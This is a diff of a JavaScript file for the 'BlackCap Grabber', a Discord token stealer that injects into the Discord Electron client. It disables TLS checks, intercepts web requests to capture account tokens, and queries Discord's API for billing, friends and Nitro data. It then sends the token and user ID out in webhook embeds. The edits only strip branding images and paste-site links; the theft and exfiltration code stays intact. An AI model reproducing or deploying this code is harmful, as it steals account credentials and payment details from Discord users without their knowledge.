@@ -1,3 +1,4 @@
+// lol
 process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
 
 const fs = require("fs")
@@ -58,7 +59,6 @@ const makeEmbed = async ({
 }) => {
     var params = {
         username: "BlackCap Grabber",
-        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         content: "",
         embeds: [{
             title: title,
@@ -273,8 +273,6 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -365,8 +363,6 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -422,7 +418,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "<a:tokens:1041634540537511957> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    value: `\`\`\`${token}\`\`\`\n`,
                     inline: !1
                 }],
                 image: userBanner,
@@ -528,9 +524,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
-
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
     var Billings = parseBilling(billing)
@@ -553,7 +546,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    value: `\`${user.id}\`\n`,
                     inline: !0
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
@@ -597,7 +590,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "<a:tokens:1041634540537511957> Token",
-                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    value: `\`\`\`${token}\`\`\`\n`,
                     inline: !1
                 }],
 
@@ -686,7 +679,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !1
                     }, {
                         name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        value: `\`\`\`${token}\`\`\`\n`,
                         inline: !1
                     }, ],
 
@@ -721,7 +714,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                        value: `\`${user.id}\`\n`,
                         inline: !0
                     }, {
                         name: "Nitro <a:nitro:1041639670288748634>",
@@ -769,7 +762,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !1
                     }, {
                         name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        value: `\`\`\`${token}\`\`\`\n`,
                         inline: !1
                     }, ],
 
